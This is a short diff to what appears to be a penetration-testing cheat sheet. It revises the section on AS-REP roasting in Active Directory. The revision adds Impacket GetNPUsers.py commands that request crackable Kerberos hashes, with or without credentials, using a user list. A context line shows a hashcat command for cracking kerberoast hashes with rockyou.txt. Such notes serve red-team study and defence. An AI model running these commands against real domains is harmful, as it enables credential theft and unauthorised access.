@@ -350,11 +350,11 @@ hashcat -m 13100 kerberoast.hashes /list/rockyou.txt
 Abusing accounts without pre-authentication to receive hashes crackable offline
 {% endembed %}
 
-This attack can be done by speaking to the domain controller, not even a valid account is needed:
+This attack can be done by speaking to the domain controller, not even a valid account is needed. You can use a list of users you found to check if they are vulnerable even without authenticating. But authentication allows you to query the LDAP server to get every existing user for sure:
 
-<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Without authentication
-<strong>GetNPUsers.py -request -format hashcat -outputfile asreproast.hashes -dc-ip $DC '$DOMAIN/'
-</strong># With authentication
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Using a list of users (no authentication)
+<strong>GetNPUsers.py -request -format hashcat -outputfile asreproast.hashes -dc-ip $DC -usersfile users.txt '$DOMAIN/'
+</strong># With authentication by querying
 <strong>GetNPUsers.py -request -format hashcat -outputfile asreproast.hashes -dc-ip $DC '$DOMAIN/$USERNAME:$PASSWORD'
 </strong></code></pre>
 
